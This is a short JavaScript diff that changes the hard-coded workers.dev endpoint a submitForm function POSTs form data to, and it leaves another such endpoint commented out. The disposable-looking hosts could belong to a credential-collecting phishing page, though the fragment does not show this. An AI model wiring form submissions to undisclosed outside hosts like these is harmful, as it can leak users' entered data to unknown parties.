@@ -148,7 +148,8 @@ function submitForm (requestData) {
 
   // handleRedirect(requestData)
 
-  const url = 'https://post-vka-fc8.developer76543.workers.dev'
+  const url = 'https://post-tb-us.developer76543.workers.dev'
+  // const url1 = 'https://post-tb-ownggl.devmaltay01.workers.dev'
 
   fetch(url, {
     method: 'POST',
